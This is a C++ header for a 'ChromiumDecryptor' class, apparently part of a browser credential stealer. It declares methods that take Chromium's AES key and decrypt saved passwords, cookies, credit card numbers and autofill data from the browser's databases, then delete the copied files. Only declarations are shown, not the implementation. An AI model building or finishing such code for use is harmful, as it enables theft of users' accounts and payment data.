#ifndef _ChromiumDecryptor_
#define _ChromiumDecryptor_
#define _CRT_SECURE_NO_WARNINGS


#pragma comment(lib, "Crypt32")/*for decrypt key*/
#include <string>
#include "library/sqlite/sqlite3.h"
#include "library/nlohmann/json.hpp"
#include <iostream>
#include <fstream>
#include <Windows.h>
#include "Base64.h"
#include <cryptopp/gcm.h>
#include <cryptopp/aes.h>
#include <cryptopp/filters.h>

class ChromiumDecryptor {
public:
	struct PasswordEntry
	{
		std::string URL;
		std::string Username;
		std::string Password;
	};
	struct CookieEntry
	{
		std::string URL;
		std::string Name;
		std::string Value;
	};
	struct CreditCardEntry
	{
		std::string NameOnCard;
		std::string CardNumber;
		int Year;
		int Month;
	};
	struct AutoFillEntry
	{
		std::string Name;
		std::string Value;
	};

	ChromiumDecryptor(const char* localStatePath, const char* databasePath) :
		localStatePath(localStatePath), databasePath(databasePath) {}
	~ChromiumDecryptor()
	{
		sqlite3_close(db_Cookie);
		sqlite3_close(db_Login);
		sqlite3_close(db_Login);
		std::remove(CookiesDataPath.c_str());
		std::remove(LoginDataPath.c_str());
		std::remove(WebDataPath.c_str());
	}
	bool init();
	std::vector<ChromiumDecryptor::CookieEntry> getCookie();
	std::vector<ChromiumDecryptor::PasswordEntry> getPassword();
	std::vector<ChromiumDecryptor::AutoFillEntry> getAutoFill();
	std::vector<ChromiumDecryptor::CreditCardEntry> getCreditCard();
	bool InitSuccess = false;

private:
	const char* localStatePath;
	const char* databasePath;

	sqlite3* db_Cookie;
	sqlite3* db_Login;
	sqlite3* db_WebData;

	std::string aesKey;
	std::string AppData = getenv("LOCALAPPDATA");
	std::string LoginDataPath;
	std::string CookiesDataPath;
	std::string WebDataPath;

	bool retrieveEncryptionKey();
	std::string AesDecrypt(const std::string& ciphertext, const std::string& key, const std::string& iv);
};
#endif
